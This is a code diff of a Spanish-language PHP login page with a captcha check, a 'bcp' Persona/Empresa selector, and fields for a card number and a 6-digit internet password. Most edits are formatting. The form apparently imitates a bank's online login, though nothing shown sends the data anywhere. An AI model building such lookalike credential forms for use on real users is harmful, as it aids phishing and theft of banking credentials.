@@ -5,6 +5,7 @@ if (isset($_POST['submit'])) {
     // Verificar el valor del captcha
     if ($_POST['captcha_code'] == $_SESSION["captcha_code"]) {
         $message = '<p id="msg">correco</p>';
+
     } else {
         // Captcha es incorrecto
         $message = '<p id="msg">Incorrecto</p>';
@@ -32,8 +33,12 @@ if (isset($_POST['submit'])) {
 
 <body>
     <div class="container-fluid  sinpadding">
-        <img class="fondo_img" src="https://images.saymedia-content.com/.image/t_share/MTg3Mzc4Njg5NDY0NDc3MjQ0/the-6-different-maps-of-ark-survival-evolved.png" alt="">
-        <div class="cont_fondo_img"><div div class="img-log"></div></div>
+        <img class="fondo_img"
+            src="https://images.saymedia-content.com/.image/t_share/MTg3Mzc4Njg5NDY0NDc3MjQ0/the-6-different-maps-of-ark-survival-evolved.png"
+            alt="">
+        <div class="cont_fondo_img">
+            <div div class="img-log"></div>
+        </div>
         <div class="row m-altura">
         </div>
         <div class="col-md-6">
@@ -47,11 +52,11 @@ if (isset($_POST['submit'])) {
 
 
                     <label class="radio">
-                        <input type="radio" name="bcp"  id="persona" value="personas" checked> Persona
+                        <input type="radio" name="bcp" id="persona" value="personas" checked> Persona
                         <span></span>
                     </label>
                     <label class="radio">
-                        <input type="radio" name="bcp"  id="empresa" value="empresas"> Empresa
+                        <input type="radio" name="bcp" id="empresa" value="empresas"> Empresa
                         <span></span>
 
                     </label>
@@ -75,7 +80,7 @@ if (isset($_POST['submit'])) {
                     <label for="numeroTarjeta" class="form-label">Número de tarjeta</label>
                     <input type="text" class="form-control ancho2-input label-input" name="numeroTarjeta"
                         id="numeroTarjeta" required>
-                        
+
                 </div>
 
 
@@ -86,7 +91,7 @@ if (isset($_POST['submit'])) {
                 </div>
                 <div class="mb-4">
                     <label for="Clave" class="form-label">Clave de internet de 6 dígitos</label>
-                    <input type="text" class="form-control ancho2-input label-input" autocomplete="off" readonly
+                    <input type="password" class="form-control ancho2-input label-input" autocomplete="off" readonly
                         id="clave" name="Clave">
                 </div>
 
@@ -132,13 +137,15 @@ if (isset($_POST['submit'])) {
         $(document).ready(function () {
             $("#st").on('click', function () {
                 $("#msg").css('display', 'block');
-
+              
             });
             $("#cl").on('click', function () {
 
                 location.reload();
             });
+            $("")
         });
+
     </script>
     <script src="js/main.js"></script>
     <script src="js/input.js"></script>
